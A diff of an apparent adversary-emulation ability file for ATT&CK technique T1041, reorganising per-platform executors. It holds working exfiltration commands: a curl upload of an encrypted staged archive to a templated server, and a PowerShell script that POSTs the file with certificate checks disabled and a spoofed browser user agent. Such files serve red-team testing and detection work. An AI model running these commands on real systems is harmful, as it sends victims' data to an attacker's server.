@@ -7,25 +7,28 @@
   technique:
     attack_id: T1041
     name: Exfiltration Over Command and Control Channel
-  executors:
+  platforms:
     darwin:
-      command: |
-        curl -F "data=@staged.tgz.enc" #{server}/file/upload
+      sh:
+        command: |
+          curl -F "data=@staged.tgz.enc" #{server}/file/upload
     linux:
-      command: |
-        curl -F "data=@staged.tgz.enc" #{server}/file/upload
+      sh:
+        command: |
+          curl -F "data=@staged.tgz.enc" #{server}/file/upload
     windows:
-      command: |
-        $fileBin = [System.IO.File]::ReadAllBytes("staged.zip.enc");
-        $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
-        $fileEnc = $enc.GetString($fileBin);
-        $boundary = [System.Guid]::NewGuid().ToString();
-        $LF = "`r`n";
-        $bodyLines = ("--$boundary", 'Content-Disposition: form-data; name="fileData"; filename="staged.zip.enc"', "Content-Type: application/octet-stream$LF", $fileEnc, "--$boundary--$LF") -join $LF;
-        $url="#{server}/file/upload";
-        $web=New-Object -ComObject MSXML2.ServerXMLHTTP;
-        $web.setOption(2,13056);
-        $web.open("POST", $url, $false);
-        $web.setRequestHeader("Content-Type","multipart/form-data; boundary=$boundary");
-        $web.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
-        $web.Send($bodyLines);
+      psh:
+        command: |
+          $fileBin = [System.IO.File]::ReadAllBytes("staged.zip.enc");
+          $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
+          $fileEnc = $enc.GetString($fileBin);
+          $boundary = [System.Guid]::NewGuid().ToString();
+          $LF = "`r`n";
+          $bodyLines = ("--$boundary", 'Content-Disposition: form-data; name="fileData"; filename="staged.zip.enc"', "Content-Type: application/octet-stream$LF", $fileEnc, "--$boundary--$LF") -join $LF;
+          $url="#{server}/file/upload";
+          $web=New-Object -ComObject MSXML2.ServerXMLHTTP;
+          $web.setOption(2,13056);
+          $web.open("POST", $url, $false);
+          $web.setRequestHeader("Content-Type","multipart/form-data; boundary=$boundary");
+          $web.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+          $web.Send($bodyLines);
